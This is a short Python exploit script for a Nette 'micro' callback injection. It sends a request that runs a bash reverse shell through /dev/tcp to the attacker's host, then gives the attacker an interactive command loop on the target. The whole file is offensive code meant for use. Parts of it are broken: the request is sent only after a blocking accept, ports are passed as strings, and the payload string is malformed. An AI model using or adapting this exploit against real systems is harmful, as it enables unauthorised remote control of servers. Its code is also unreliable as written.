#!/usr/bin/python
# author: @fr0z3nsp4z3

import sys
import socket
from urllib import request

url = sys.argv[1]
port = sys.argv[2]

lhost = sys.argv[3]
lport = sys.argv[4]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # start a socket object 's'

s.bind((lhost, lport))  # define the kali IP and the listening port

s.listen(1)  # define the backlog size, since we are expecting a single connection from a single
# target we will listen to one connection

print('[+] Listening for incoming TCP connection on port 9999')

conn, addr = s.accept()
r = request.urlopen(url+':'+port+'/nette.micro?callback=system(%22bash%20-i%20>&%20/dev/tcp/'+lhost+'/'+lport+'0>&1')

print('[+] We got a connection from: ', addr)

while True:
    command = input()  # Get user input and store it in command variable

    if 'exit' in command:  # If we got terminate command, inform the client and close the connect and break the loop
        conn.close()
        break

    else:
        conn.send(bytes(command))  # Otherwise we will send the command to the target
        print(conn.recv(1024))  # and print the result that we got back
